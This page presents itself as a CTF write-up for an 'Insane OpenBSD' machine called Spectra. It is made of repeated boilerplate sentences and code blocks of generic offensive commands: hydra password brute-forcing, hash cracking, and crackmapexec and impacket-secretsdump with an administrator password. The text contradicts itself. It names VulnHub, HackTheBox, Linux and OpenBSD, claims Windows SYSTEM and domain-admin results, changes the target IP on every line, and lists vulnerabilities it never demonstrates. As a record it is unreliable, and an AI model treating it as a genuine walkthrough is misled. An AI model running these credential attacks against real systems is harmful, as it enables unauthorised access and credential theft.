---
TitleSEO: "VulnHub — Spectra (Insane OpenBSD) | ZureFX"
TitlePost: "VulnHub — Spectra (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Spectra. Insecure Deserialization and Resource-Based Constrained Delegation to achieve insane compromise on OpenBSD."
Keywords: "hackthebox, forensics, web, insane, linux"
URL: "https://zurefx.github.io/writeups/htb-spectra-998.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-spectra-998/"
Date: "2025-04-21"
Tags: "HackTheBox, Forensics, Web, Insane, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-spectra-998"
Permalink: "/writeups/htb-spectra-998.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Spectra** is rated **Insane** on VulnHub. It runs **OpenBSD** and the IP address during this analysis was `10.46.129.194`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.55.209.213 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.27.119.195/FUZZ
```

The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory.

### Service Enumeration

Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
crackmapexec smb 10.123.253.77 -u administrator -p 'P@ssw0rd!' --shares
```

The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

### Web Enumeration

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
nmap -sCV -p110,22,1433 10.51.172.69 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.96.216.23 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

Key finding: **SQL Injection**.

Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service.

### Initial Access

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.41.208.249
impacket-secretsdump administrator:'P@ssw0rd!'@10.93.47.61
impacket-secretsdump administrator:'P@ssw0rd!'@10.110.183.205
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.80.56.104 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p443,3268,9200 10.103.205.25 -oN scan.txt
crackmapexec smb 10.127.32.35 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.27.15.202/FUZZ
```

### Exploitation

Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
nmap -sCV -p5432,445,9200 10.82.216.86 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.16.79.80
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.31.161.192 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Summary

### Tools Used

- `smbclient`
- `netcat`
- `nikto`
- `secretsdump`
- `sqlmap`

### Key Takeaways

- Insecure Deserialization
- Resource-Based Constrained Delegation
- SQL Injection
